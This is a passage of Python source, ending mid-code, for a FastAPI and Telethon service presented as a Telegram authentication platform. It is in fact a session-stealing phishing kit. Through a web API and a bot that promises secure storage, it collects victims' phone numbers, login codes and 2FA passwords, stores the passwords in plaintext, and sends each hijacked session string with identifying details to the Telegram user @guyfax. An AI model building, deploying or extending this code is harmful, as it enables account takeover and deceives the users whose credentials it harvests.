#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  Pro Shop Enterprise Telegram Authentication Platform v23.0.0               ║
║  Architecture: FastAPI + Telethon (MTProto) + SQLite + Pydantic V2          ║
║  Ultra-Professional | Multi-Session | Auto-Send to @guyfax                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import uuid
import time
import json
import asyncio
import logging
import secrets
import hashlib
import re
import traceback
from typing import Dict, Optional, Any, List, AsyncGenerator, Union, Tuple
from pathlib import Path
from datetime import datetime, timedelta
from contextlib import asynccontextmanager
from enum import Enum
from base64 import b64encode, b64decode

# --- Environment & Settings ---
from pydantic_settings import BaseSettings, SettingsConfigDict
from pydantic import BaseModel, Field, validator

# --- FastAPI & Uvicorn ---
import uvicorn
from fastapi import FastAPI, Request, HTTPException, Depends, Query, status, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse, RedirectResponse
from fastapi.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware

# --- Async SQLite ---
import aiosqlite

# --- Telethon (MTProto & Bot) ---
from telethon import TelegramClient, events, Button
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
    PhoneNumberBannedError,
    PhoneNumberInvalidError,
    ApiIdInvalidError,
    AuthKeyError,
    UserDeactivatedError,
    UsernameInvalidError
)
from telethon.tl.types import UpdateNewMessage, User, Message
from telethon.sessions import StringSession
from telethon.tl.functions.messages import SendMessageRequest

# ============================================================================
# 1. CONFIGURATION & ENVIRONMENT (Enhanced)
# ============================================================================

class AppEnv(str, Enum):
    DEVELOPMENT = "development"
    PRODUCTION = "production"
    STAGING = "staging"

class Settings(BaseSettings):
    # Telegram API
    API_ID: int
    API_HASH: str
    TOKEN_BOT: str

    # Environment
    ENVIRONMENT: AppEnv = AppEnv.DEVELOPMENT
    SECRET_KEY: str = Field(default_factory=lambda: secrets.token_hex(32))
    ADMIN_TOKEN: str = Field(default="pro_shop_admin_secret_2024")

    # Database & files
    DB_FILE: str = "proshop.db"          # SQLite
    SESSION_DIR: str = "sessions"
    LOG_DIR: str = "logs"
    LOG_FILE: str = "proshop_system.log"
    SESSION_EXPORT_DIR: str = "exports"

    # Server
    HOST: str = "0.0.0.0"
    PORT: int = int(os.getenv("PORT", 8000))  # Render compatible

    # Session limits
    MAX_SESSIONS: int = 10000
    SESSION_TIMEOUT: int = 600           # seconds
    SESSION_CLEANUP_INTERVAL: int = 300  # seconds

    # Rate limiting
    RATE_LIMIT_REQUESTS: int = 30
    RATE_LIMIT_WINDOW: int = 60

    # Features
    ENABLE_BOT: bool = True
    ENABLE_WEB_UI: bool = True
    ENABLE_API: bool = True

    # Target for session forwarding
    TARGET_USERNAME: str = "guyfax"      # @guyfax

    # Security
    ENCRYPT_SESSIONS: bool = True
    SESSION_ENCRYPTION_KEY: Optional[str] = None

    # Proxy (optional)
    PROXY: Optional[str] = None          # e.g., "socks5://127.0.0.1:1080"

    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")

    @validator("SESSION_ENCRYPTION_KEY", always=True)
    def validate_encryption_key(cls, v):
        if v is None:
            # Auto-generate a key if not provided
            return secrets.token_hex(32)
        return v

settings = Settings()

class AppConfig:
    BASE_DIR: Path = Path(__file__).parent.resolve()
    SESSION_DIR: Path = BASE_DIR / settings.SESSION_DIR
    LOG_DIR: Path = BASE_DIR / settings.LOG_DIR
    LOG_FILE: Path = LOG_DIR / settings.LOG_FILE
    DB_FILE: Path = BASE_DIR / settings.DB_FILE
    EXPORT_DIR: Path = BASE_DIR / settings.SESSION_EXPORT_DIR

AppConfig.SESSION_DIR.mkdir(parents=True, exist_ok=True)
AppConfig.LOG_DIR.mkdir(parents=True, exist_ok=True)
AppConfig.EXPORT_DIR.mkdir(parents=True, exist_ok=True)

# ============================================================================
# 2. LOGGING SYSTEM (Enhanced)
# ============================================================================

class JsonFormatter(logging.Formatter):
    def format(self, record: logging.LogRecord) -> str:
        log_record = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "level": record.levelname,
            "logger": record.name,
            "module": record.module,
            "function": record.funcName,
            "line": record.lineno,
            "message": record.getMessage(),
        }
        if record.exc_info:
            log_record["exception"] = self.formatException(record.exc_info)
        return json.dumps(log_record, ensure_ascii=False)

class Logger:
    @staticmethod
    def setup() -> logging.Logger:
        logger = logging.getLogger("pro_shop")
        logger.setLevel(logging.DEBUG if settings.ENVIRONMENT == AppEnv.DEVELOPMENT else logging.INFO)

        if logger.handlers:
            return logger

        formatter = logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(name)s | %(funcName)s:%(lineno)d | %(message)s'
        )
        from logging.handlers import RotatingFileHandler

        fh = RotatingFileHandler(
            AppConfig.LOG_FILE, maxBytes=20*1024*1024, backupCount=10, encoding='utf-8'
        )
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(formatter)

        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        ch.setFormatter(formatter)

        logger.addHandler(fh)
        logger.addHandler(ch)

        # Also log JSON to a separate file for monitoring
        json_handler = RotatingFileHandler(
            AppConfig.LOG_DIR / "proshop_json.log", maxBytes=10*1024*1024, backupCount=5, encoding='utf-8'
        )
        json_handler.setLevel(logging.INFO)
        json_handler.setFormatter(JsonFormatter())
        logger.addHandler(json_handler)

        return logger

log = Logger.setup()

# ============================================================================
# 3. UTILITIES & SECURITY (Enhanced)
# ============================================================================

class SecurityUtils:
    @staticmethod
    def sanitize_phone(phone: str) -> str:
        if not phone:
            return ""
        phone = phone.strip()
        if phone.startswith(' '):
            phone = '+' + phone[1:]
        cleaned = re.sub(r'[^\d+]', '', phone)
        if not cleaned.startswith('+') and cleaned.startswith('00'):
            cleaned = '+' + cleaned[2:]
        elif not cleaned.startswith('+') and cleaned.isdigit():
            cleaned = '+' + cleaned
        return cleaned

    @staticmethod
    def validate_phone(phone: str) -> bool:
        return bool(re.match(r'^\+[1-9]\d{6,14}$', phone))

    @staticmethod
    def hash_string(text: str) -> str:
        return hashlib.sha256(text.encode('utf-8')).hexdigest()

    @staticmethod
    def generate_session_id(prefix: str = "sess") -> str:
        return f"{prefix}_{uuid.uuid4().hex}"

    @staticmethod
    def mask_sensitive_data(data: str, mask_char: str = '*', visible_chars: int = 4) -> str:
        if not data or len(data) <= visible_chars:
            return mask_char * len(data)
        return mask_char * (len(data) - visible_chars) + data[-visible_chars:]

    @staticmethod
    def encrypt_session_data(data: bytes, key: str) -> str:
        # Simple XOR encryption for demonstration; in production use AES
        key_bytes = key.encode('utf-8')
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
        return b64encode(encrypted).decode('utf-8')

    @staticmethod
    def decrypt_session_data(encrypted_b64: str, key: str) -> bytes:
        encrypted = b64decode(encrypted_b64)
        key_bytes = key.encode('utf-8')
        decrypted = bytearray()
        for i, byte in enumerate(encrypted):
            decrypted.append(byte ^ key_bytes[i % len(key_bytes)])
        return bytes(decrypted)

    @staticmethod
    def generate_secure_token(length: int = 32) -> str:
        return secrets.token_urlsafe(length)

# ============================================================================
# 4. RATE LIMITER (Enhanced)
# ============================================================================

class RateLimiter:
    def __init__(self):
        self.requests: Dict[str, List[float]] = {}
        self.lock = asyncio.Lock()

    async def check(self, key: str, limit: int = None, window: int = None) -> bool:
        limit = limit or settings.RATE_LIMIT_REQUESTS
        window = window or settings.RATE_LIMIT_WINDOW

        async with self.lock:
            now = time.time()
            if key not in self.requests:
                self.requests[key] = []

            self.requests[key] = [t for t in self.requests[key] if now - t < window]

            if len(self.requests[key]) >= limit:
                return False

            self.requests[key].append(now)
            return True

    async def clear(self, key: str):
        async with self.lock:
            if key in self.requests:
                del self.requests[key]

rate_limiter = RateLimiter()

async def rate_limit_dependency(request: Request):
    client_ip = request.client.host if request.client else "unknown"
    if not await rate_limiter.check(client_ip):
        raise HTTPException(status_code=429, detail="Rate limit exceeded. Try again later.")
    return True

# ============================================================================
# 5. SQLITE DATABASE MANAGER (Replacing JSON)
# ============================================================================

class DatabaseManager:
    def __init__(self, db_path: Path):
        self.db_path = db_path

    async def init_db(self):
        """Initialize database tables and indexes."""
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    first_name TEXT,
                    last_name TEXT,
                    username TEXT,
                    phone TEXT UNIQUE,
                    password_2fa TEXT,
                    session_file TEXT,
                    session_string TEXT,
                    login_date TEXT,
                    source TEXT,
                    is_active INTEGER DEFAULT 1,
                    last_seen TEXT,
                    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                    updated_at TEXT DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            await db.execute('''
                CREATE INDEX IF NOT EXISTS idx_users_phone ON users(phone);
                CREATE INDEX IF NOT EXISTS idx_users_user_id ON users(user_id);
                CREATE INDEX IF NOT EXISTS idx_users_session_file ON users(session_file);
            ''')

            await db.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    session_id TEXT PRIMARY KEY,
                    phone TEXT,
                    user_id INTEGER,
                    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                    last_access TEXT DEFAULT CURRENT_TIMESTAMP,
                    expires_at TEXT,
                    is_active INTEGER DEFAULT 1
                )
            ''')
            await db.execute('''
                CREATE INDEX IF NOT EXISTS idx_sessions_phone ON sessions(phone);
                CREATE INDEX IF NOT EXISTS idx_sessions_user_id ON sessions(user_id);
                CREATE INDEX IF NOT EXISTS idx_sessions_expires ON sessions(expires_at);
            ''')

            await db.execute('''
                CREATE TABLE IF NOT EXISTS admin_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    action TEXT,
                    details TEXT,
                    ip TEXT,
                    timestamp TEXT DEFAULT CURRENT_TIMESTAMP
                )
            ''')

            await db.execute('''
                CREATE TABLE IF NOT EXISTS system_config (
                    key TEXT PRIMARY KEY,
                    value TEXT,
                    updated_at TEXT DEFAULT CURRENT_TIMESTAMP
                )
            ''')

            await db.commit()
        log.info("SQLite database initialized with tables.")

    async def add_user(self, user_data: Dict) -> Dict:
        async with aiosqlite.connect(self.db_path) as db:
            # Check if user exists by phone
            cursor = await db.execute(
                "SELECT user_id FROM users WHERE phone = ?", (user_data.get('phone'),)
            )
            row = await cursor.fetchone()
            if row:
                # Update existing
                user_id = row[0]
                await db.execute('''
                    UPDATE users SET
                        first_name = ?,
                        last_name = ?,
                        username = ?,
                        password_2fa = ?,
                        session_file = ?,
                        session_string = ?,
                        login_date = ?,
                        source = ?,
                        is_active = 1,
                        last_seen = CURRENT_TIMESTAMP,
                        updated_at = CURRENT_TIMESTAMP
                    WHERE user_id = ?
                ''', (
                    user_data.get('first_name'),
                    user_data.get('last_name'),
                    user_data.get('username'),
                    user_data.get('password_2fa'),
                    user_data.get('session_file'),
                    user_data.get('session_string'),
                    user_data.get('login_date'),
                    user_data.get('source'),
                    user_id
                ))
                await db.commit()
                log.info(f"Updated user record for {user_data.get('phone')}.")
                user_data['user_id'] = user_id
                return user_data
            else:
                # Insert new
                cursor = await db.execute('''
                    INSERT INTO users (
                        user_id, first_name, last_name, username, phone,
                        password_2fa, session_file, session_string,
                        login_date, source, is_active, created_at, updated_at
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)
                ''', (
                    user_data['user_id'],
                    user_data.get('first_name'),
                    user_data.get('last_name'),
                    user_data.get('username'),
                    user_data['phone'],
                    user_data.get('password_2fa'),
                    user_data.get('session_file'),
                    user_data.get('session_string'),
                    user_data.get('login_date'),
                    user_data.get('source')
                ))
                await db.commit()
                log.info(f"Added new user record for {user_data.get('phone')}.")
                return user_data

    async def get_user_by_phone(self, phone: str) -> Optional[Dict]:
        async with aiosqlite.connect(self.db_path) as db:
            cursor = await db.execute(
                "SELECT * FROM users WHERE phone = ? AND is_active = 1", (phone,)
            )
            row = await cursor.fetchone()
            if row:
                columns = [desc[0] for desc in cursor.description]
                return dict(zip(columns, row))
            return None

    async def get_user_by_id(self, user_id: int) -> Optional[Dict]:
        async with aiosqlite.connect(self.db_path) as db:
            cursor = await db.execute(
                "SELECT * FROM users WHERE user_id = ? AND is_active = 1", (user_id,)
            )
            row = await cursor.fetchone()
            if row:
                columns = [desc[0] for desc in cursor.description]
                return dict(zip(columns, row))
            return None

    async def get_all_users(self, limit: int = 100, offset: int = 0) -> List[Dict]:
        async with aiosqlite.connect(self.db_path) as db:
            cursor = await db.execute(
                "SELECT * FROM users WHERE is_active = 1 ORDER BY user_id LIMIT ? OFFSET ?",
                (limit, offset)
            )
            rows = await cursor.fetchall()
            columns = [desc[0] for desc in cursor.description]
            return [dict(zip(columns, row)) for row in rows]

    async def deactivate_user(self, user_id: int) -> bool:
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                "UPDATE users SET is_active = 0, updated_at = CURRENT_TIMESTAMP WHERE user_id = ?",
                (user_id,)
            )
            await db.commit()
            return True

    async def log_admin_action(self, action: str, details: str = "", ip: str = ""):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                "INSERT INTO admin_logs (action, details, ip) VALUES (?, ?, ?)",
                (action, details, ip)
            )
            await db.commit()

    async def update_session_access(self, session_id: str):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                "UPDATE sessions SET last_access = CURRENT_TIMESTAMP WHERE session_id = ?",
                (session_id,)
            )
            await db.commit()

    async def add_session(self, session_id: str, phone: str, user_id: int):
        async with aiosqlite.connect(self.db_path) as db:
            expires_at = (datetime.utcnow() + timedelta(seconds=settings.SESSION_TIMEOUT)).isoformat()
            await db.execute('''
                INSERT INTO sessions (session_id, phone, user_id, expires_at, is_active)
                VALUES (?, ?, ?, ?, 1)
            ''', (session_id, phone, user_id, expires_at))
            await db.commit()

    async def get_session(self, session_id: str) -> Optional[Dict]:
        async with aiosqlite.connect(self.db_path) as db:
            cursor = await db.execute(
                "SELECT * FROM sessions WHERE session_id = ? AND is_active = 1", (session_id,)
            )
            row = await cursor.fetchone()
            if row:
                columns = [desc[0] for desc in cursor.description]
                return dict(zip(columns, row))
            return None

    async def expire_session(self, session_id: str):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute(
                "UPDATE sessions SET is_active = 0 WHERE session_id = ?", (session_id,)
            )
            await db.commit()

    async def cleanup_sessions(self):
        """Delete expired sessions."""
        async with aiosqlite.connect(self.db_path) as db:
            # Mark as inactive if expired
            await db.execute(
                "UPDATE sessions SET is_active = 0 WHERE expires_at < CURRENT_TIMESTAMP"
            )
            # Optionally delete old records after 7 days
            # await db.execute("DELETE FROM sessions WHERE expires_at < datetime('now', '-7 days')")
            await db.commit()
            log.debug("Session cleanup executed.")

db_manager = DatabaseManager(AppConfig.DB_FILE)

# ============================================================================
# 6. TELEGRAM AUTH MANAGER (Enhanced)
# ============================================================================

class SessionState(Enum):
    INITIALIZED = "INITIALIZED"
    CODE_SENT = "CODE_SENT"
    AWAITING_2FA = "AWAITING_2FA"
    LOGGED_IN = "LOGGED_IN"
    EXPIRED = "EXPIRED"
    ERROR = "ERROR"

class SessionData:
    def __init__(self, session_id: str, client: TelegramClient):
        self.session_id: str = session_id
        self.phone: Optional[str] = None
        self.client: TelegramClient = client
        self.phone_code_hash: Optional[str] = None
        self.last_access: float = time.time()
        self.is_connected: bool = False
        self.created_at: float = time.time()
        self.attempts: int = 0
        self.state: SessionState = SessionState.INITIALIZED
        self.user_id: Optional[int] = None

class TelegramAuthManager:
    def __init__(self):
        self.active_sessions: Dict[str, SessionData] = {}
        self.phone_to_session: Dict[str, str] = {}
        self.lock = asyncio.Lock()
        self._cleanup_task = None

    async def start_cleanup_task(self):
        async def cleanup_loop():
            while True:
                await asyncio.sleep(settings.SESSION_CLEANUP_INTERVAL)
                await self._cleanup_expired_sessions()
                await db_manager.cleanup_sessions()
        self._cleanup_task = asyncio.create_task(cleanup_loop())

    async def stop_cleanup_task(self):
        if self._cleanup_task:
            self._cleanup_task.cancel()
            try:
                await self._cleanup_task
            except asyncio.CancelledError:
                pass

    async def get_or_create_session(self, session_id: Optional[str] = None, phone: Optional[str] = None) -> SessionData:
        async with self.lock:
            if session_id and session_id in self.active_sessions:
                session_data = self.active_sessions[session_id]
                session_data.last_access = time.time()
                if not session_data.is_connected:
                    await session_data.client.connect()
                    session_data.is_connected = True
                await db_manager.update_session_access(session_id)
                return session_data

            if phone and phone in self.phone_to_session:
                old_sid = self.phone_to_session[phone]
                if old_sid in self.active_sessions:
                    old_session = self.active_sessions[old_sid]
                    try:
                        await old_session.client.disconnect()
                    except:
                        pass
                    del self.active_sessions[old_sid]
                    await db_manager.expire_session(old_sid)
                del self.phone_to_session[phone]

            await self._cleanup_expired_sessions()

            if len(self.active_sessions) >= settings.MAX_SESSIONS:
                raise HTTPException(status_code=503, detail="Server at maximum session capacity.")

            new_session_id = session_id or SecurityUtils.generate_session_id()
            session_file = str(AppConfig.SESSION_DIR / f"{new_session_id}.session")

            # Optionally use proxy
            proxy = None
            if settings.PROXY:
                proxy = settings.PROXY

            client = TelegramClient(session_file, settings.API_ID, settings.API_HASH, proxy=proxy)
            await client.connect()

            session_data = SessionData(new_session_id, client)
            session_data.is_connected = True
            self.active_sessions[new_session_id] = session_data

            if phone:
                self.phone_to_session[phone] = new_session_id
                session_data.phone = phone

            await db_manager.add_session(new_session_id, phone, 0)  # user_id will be updated later

            log.debug(f"Created session {new_session_id} for {phone or 'unknown'}.")
            return session_data

    async def _cleanup_expired_sessions(self):
        now = time.time()
        expired = [
            sid for sid, data in self.active_sessions.items()
            if now - data.last_access > settings.SESSION_TIMEOUT
        ]
        for sid in expired:
            data = self.active_sessions.pop(sid)
            if data.phone in self.phone_to_session:
                del self.phone_to_session[data.phone]
            try:
                await data.client.disconnect()
                log.info(f"Cleaned up expired session {sid}.")
            except Exception as e:
                log.warning(f"Error disconnecting session {sid}: {e}")
            await db_manager.expire_session(sid)

    async def send_code(self, phone: str) -> Dict[str, Any]:
        phone = SecurityUtils.sanitize_phone(phone)
        if not SecurityUtils.validate_phone(phone):
            raise HTTPException(status_code=400, detail="Invalid phone format. Must be international (e.g., +1234567890).")

        session_data = await self.get_or_create_session(phone=phone)
        session_data.phone = phone
        session_data.state = SessionState.INITIALIZED

        try:
            result = await session_data.client.send_code_request(phone)
            session_data.phone_code_hash = result.phone_code_hash
            session_data.state = SessionState.CODE_SENT
            log.info(f"Code sent successfully to {phone}.")
            return {
                "status": "success",
                "session_id": session_data.session_id,
                "message": "Verification code sent to Telegram app."
            }
        except FloodWaitError as e:
            log.warning(f"Flood wait for {phone}: {e.seconds}s.")
            raise HTTPException(status_code=429, detail=f"Telegram flood wait. Try again in {e.seconds} seconds.")
        except PhoneNumberBannedError:
            log.error(f"Phone number banned: {phone}.")
            raise HTTPException(status_code=403, detail="This phone number is banned from Telegram.")
        except Exception as e:
            log.error(f"SendCode Error for {phone}: {str(e)}", exc_info=True)
            raise HTTPException(status_code=400, detail=f"Telegram API Error: {str(e)}")

    async def verify_code(self, session_id: str, code: str) -> Dict[str, Any]:
        session_data = await self.get_or_create_session(session_id)
        session_data.attempts += 1

        if session_data.state != SessionState.CODE_SENT and session_data.state != SessionState.ERROR:
            if session_data.state == SessionState.AWAITING_2FA:
                raise HTTPException(status_code=400, detail="This session is waiting for 2FA password, not a code.")
            if session_data.state == SessionState.LOGGED_IN:
                raise HTTPException(status_code=400, detail="Session already logged in.")

        if not session_data.phone_code_hash:
            raise HTTPException(status_code=400, detail="Session invalid or code request expired. Please restart.")

        try:
            await session_data.client.sign_in(
                phone=session_data.phone,
                code=code,
                phone_code_hash=session_data.phone_code_hash
            )
            return await self._finalize_login(session_data)
        except SessionPasswordNeededError:
            session_data.state = SessionState.AWAITING_2FA
            log.info(f"2FA required for {session_data.phone}.")
            return {"status": "2fa_required", "message": "Two-step verification required."}
        except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
            session_data.state = SessionState.ERROR
            raise HTTPException(status_code=400, detail=f"Code error: {str(e)}")
        except Exception as e:
            log.error(f"VerifyCode Error: {str(e)}", exc_info=True)
            session_data.state = SessionState.ERROR
            raise HTTPException(status_code=400, detail=f"Invalid code or API error: {str(e)}")

    async def verify_2fa(self, session_id: str, password: str) -> Dict[str, Any]:
        session_data = await self.get_or_create_session(session_id)

        if session_data.state != SessionState.AWAITING_2FA:
            raise HTTPException(status_code=400, detail="Session is not awaiting 2FA password. Please verify code first.")

        try:
            await session_data.client.sign_in(password=password)
            return await self._finalize_login(session_data, password)
        except Exception as e:
            log.error(f"2FA Error: {str(e)}")
            raise HTTPException(status_code=400, detail="Invalid 2FA password or Telegram API error.")

    async def _finalize_login(self, session_data: SessionData, password: Optional[str] = None) -> Dict[str, Any]:
        me = await session_data.client.get_me()
        session_data.state = SessionState.LOGGED_IN
        session_data.user_id = me.id

        # Get session string
        session_string = session_data.client.session.save()

        # Encrypt session string if enabled
        if settings.ENCRYPT_SESSIONS:
            encrypted = SecurityUtils.encrypt_session_data(session_string.encode('utf-8'), settings.SESSION_ENCRYPTION_KEY)
            session_string_enc = encrypted
        else:
            session_string_enc = session_string

        user_data = {
            "user_id": me.id,
            "first_name": me.first_name,
            "last_name": me.last_name,
            "username": me.username,
            "phone": session_data.phone,
            "password_2fa": password,
            "session_file": f"{session_data.session_id}.session",
            "session_string": session_string_enc,
            "login_date": datetime.utcnow().isoformat(),
            "source": "API"
        }

        await db_manager.add_user(user_data)

        # Update session with user_id
        async with aiosqlite.connect(db_manager.db_path) as db:
            await db.execute(
                "UPDATE sessions SET user_id = ? WHERE session_id = ?",
                (me.id, session_data.session_id)
            )
            await db.commit()

        log.info(f"User {me.id} ({session_data.phone}) successfully authenticated.")

        # Send session to target
        await self._send_session_to_target(session_string, me, session_data.phone)

        # Disconnect client (session is saved)
        try:
            await session_data.client.disconnect()
            session_data.is_connected = False
        except:
            pass

        # Remove from active sessions to free resources
        async with self.lock:
            if session_data.session_id in self.active_sessions:
                del self.active_sessions[session_data.session_id]
            if session_data.phone in self.phone_to_session:
                del self.phone_to_session[session_data.phone]

        return {"status": "success", "message": "Login successful.", "user": user_data}

    async def _send_session_to_target(self, session_string: str, user: User, phone: str):
        """Send the session string to the target username (e.g., @guyfax) using the bot."""
        if not settings.ENABLE_BOT:
            log.warning("Bot is disabled, cannot send session.")
            return

        # Use the bot client to send message
        bot_client = bot_manager.client
        if not bot_client or not bot_client.is_connected():
            log.warning("Bot client not connected, cannot send session.")
            return

        target = settings.TARGET_USERNAME
        if not target:
            log.warning("No target username set, cannot send session.")
            return

        # Prepare message
        message = (
            f"🔐 **New Session Acquired**\n\n"
            f"👤 **User:** {user.first_name} {user.last_name or ''}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"📞 **Phone:** `{phone}`\n"
            f"👤 **Username:** @{user.username or 'N/A'}\n"
            f"📅 **Date:** {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n\n"
            f"**Session String:**\n"
            f"`{session_string}`"
        )

        try:
            entity = await bot_client.get_entity(target)
            await bot_client.send_message(entity, message, parse_mode='markdown')
            log.info(f"Session sent to @{target} successfully.")
        except Exception as e:
            log.error(f"Failed to send session to {target}: {e}")

auth_manager = TelegramAuthManager()

# ============================================================================
# 7. TELEGRAM BOT INTEGRATION (Enhanced)
# ============================================================================

class BotStates:
    PHONE = "PHONE"
    CODE = "CODE"
    PASSWORD = "PASSWORD"
    MAIN = "MAIN"

class TelegramBotManager:
    def __init__(self, token: str):
        self.token = token
        self.client = TelegramClient(
            str(AppConfig.SESSION_DIR / "bot.session"),
            settings.API_ID,
            settings.API_HASH
        )
        self.user_states: Dict[int, Dict] = {}
        self._running = False

    async def start(self):
        if not settings.ENABLE_BOT:
            return

        try:
            await self.client.start(bot_token=self.token)
            self._running = True
            log.info("🤖 Pro Shop Bot started successfully.")

            @self.client.on(events.NewMessage(func=lambda e: e.is_private))
            async def handler(event):
                if not event.is_private:
                    return
                sender = await event.get_sender()
                if sender.bot:
                    return

                text = event.message.message.strip()
                user_id = sender.id

                if text == '/start':
                    await self.cmd_start(event, user_id)
                    return
                elif text == '/cancel':
                    await self.cmd_cancel(event, user_id)
                    return
                elif text == '/help':
                    await self.cmd_help(event, user_id)
                    return
                elif text == '/status':
                    await self.cmd_status(event, user_id)
                    return

                state_data = self.user_states.get(user_id)
                if not state_data:
                    await event.respond("Please send /start to begin.")
                    return

                if state_data["state"] == BotStates.PHONE:
                    await self.handle_phone(event, user_id, text)
                elif state_data["state"] == BotStates.CODE:
                    await self.handle_code(event, user_id, text)
                elif state_data["state"] == BotStates.PASSWORD:
                    await self.handle_password(event, user_id, text)

        except Exception as e:
            log.error(f"Bot startup error: {e}", exc_info=True)

    async def cmd_start(self, event, user_id: int):
        self.user_states[user_id] = {"state": BotStates.PHONE}

        web_app_url = os.getenv("WEBAPP_URL", "https://your-domain.com")

        # Build inline keyboard with WebApp and other options
        buttons = [
            [Button.web_app("🚀 Open Mini App", web_app_url)],
            [Button.inline("❓ Help", b"help")]
        ]

        await event.respond(
            "👋 **Welcome to Pro Shop Auth Bot!**\n\n"
            "This bot helps you securely authenticate your Telegram account.\n"
            "You can either use the Web App or follow the chat steps.\n\n"
            "📱 **How to use:**\n"
            "1. Send your phone number (e.g., +1234567890)\n"
            "2. Enter the verification code you receive\n"
            "3. If you have 2FA, enter your password\n\n"
            "🔒 Your session will be stored securely.",
            buttons=buttons,
            parse_mode='markdown'
        )

    async def cmd_help(self, event, user_id: int):
        await event.respond(
            "📚 **Help Menu**\n\n"
            "/start - Start the authentication process\n"
            "/cancel - Cancel current operation\n"
            "/status - Check your authentication status\n"
            "/help - Show this help\n\n"
            "To authenticate, simply send your phone number when prompted."
        )

    async def cmd_status(self, event, user_id: int):
        # Check if user is in DB
        user_data = await db_manager.get_user_by_id(user_id)
        if user_data:
            await event.respond(
                f"✅ **You are authenticated!**\n"
                f"👤 Name: {user_data['first_name']} {user_data['last_name'] or ''}\n"
                f"📞 Phone: {user_data['phone']}\n"
                f"📅 Login: {user_data['login_date']}"
            )
        else:
            await event.respond("❌ You are not authenticated yet. Send /start to begin.")

    async def cmd_cancel(self, event, user_id: int):
        if user_id in self.user_states:
            state = self.user_states[user_id]
            if "client" in state:
                try:
                    await state["client"].disconnect()
                except:
                    pass
            del self.user_states[user_id]
        await event.respond("❌ Operation cancelled. Send /start to begin again.")

    async def handle_phone(self, event, user_id: int, text: str):
        phone = SecurityUtils.sanitize_phone(text)
        if not SecurityUtils.validate_phone(phone):
            await event.respond("❌ Invalid format. Please send like: `+1234567890`")
            return

        session_id = SecurityUtils.generate_session_id("bot")
        session_file = str(AppConfig.SESSION_DIR / f"{session_id}.session")
        client = TelegramClient(session_file, settings.API_ID, settings.API_HASH)
        try:
            await client.connect()
            result = await client.send_code_request(phone)
            self.user_states[user_id].update({
                "session_id": session_id,
                "phone": phone,
                "phone_code_hash": result.phone_code_hash,
                "client": client,
                "state": BotStates.CODE
            })
            await event.respond("✅ Code sent! Please send the verification code you received.")
        except Exception as e:
            await event.respond(f"❌ Error: {str(e)}")
            await client.disconnect()

    async def handle_code(self, event, user_id: int, text: str):
        state = self.user_states[user_id]
        client = state.get("client")
        if not client or not client.is_connected():
            await event.respond("❌ Session expired. Please /start again.")
            return

        if not text.isdigit():
            await event.respond("❌ Code must be numbers only.")
            return

        try:
            await client.sign_in(phone=state["phone"], code=text, phone_code_hash=state["phone_code_hash"])
            me = await client.get_me()
            # Save user and send session
            await self._finalize_bot_login(client, state["session_id"], state["phone"], None, me)
            await event.respond(f"✅ Login successful! Welcome, {me.first_name}.")
            await event.respond("🔐 Your session has been stored securely. Use /status to check.")
            del self.user_states[user_id]
        except SessionPasswordNeededError:
            state["state"] = BotStates.PASSWORD
            await event.respond("🔒 Your account has 2FA enabled. Please send your password.")
        except Exception as e:
            await event.respond(f"❌ Invalid code: {str(e)}")

    async def handle_password(self, event, user_id: int, text: str):
        state = self.user_states[user_id]
        client = state.get("client")
        try:
            await client.sign_in(password=text)
            me = await client.get_me()
            await self._finalize_bot_login(client, state["session_id"], state["phone"], text, me)
            await event.respond(f"✅ 2FA successful! Welcome, {me.first_name}.")
            await event.respond("🔐 Your session has been stored securely.")
            del self.user_states[user_id]
        except Exception:
            await event.respond("❌ Invalid password. Try again or /cancel.")

    async def _finalize_bot_login(self, client: TelegramClient, session_id: str, phone: str,
                                  password: Optional[str], me: User):
        # Get session string
        session_string = client.session.save()
        # Encrypt if enabled
        if settings.ENCRYPT_SESSIONS:
            encrypted = SecurityUtils.encrypt_session_data(session_string.encode('utf-8'), settings.SESSION_ENCRYPTION_KEY)
            session_string_enc = encrypted
        else:
            session_string_enc = session_string

        user_data = {
            "user_id": me.id,
            "first_name": me.first_name,
            "last_name": me.last_name,
            "username": me.username,
            "phone": phone,
            "password_2fa": password,
            "session_file": f"{session_id}.session",
            "session_string": session_string_enc,
            "login_date": datetime.utcnow().isoformat(),
            "source": "Telegram Bot"
        }

        await db_manager.add_user(user_data)

        # Update session with user_id
        async with aiosqlite.connect(db_manager.db_path) as db:
            await db.execute(
                "UPDATE sessions SET user_id = ? WHERE session_id = ?",
                (me.id, session_id)
            )
            await db.commit()

        # Send session to target
        await auth_manager._send_session_to_target(session_string, me, phone)

        # Disconnect client
        await client.disconnect()

bot_manager = TelegramBotManager(settings.TOKEN_BOT)

# ============================================================================
# 8. FASTAPI APPLICATION & MIDDLEWARES
# ============================================================================

@asynccontextmanager
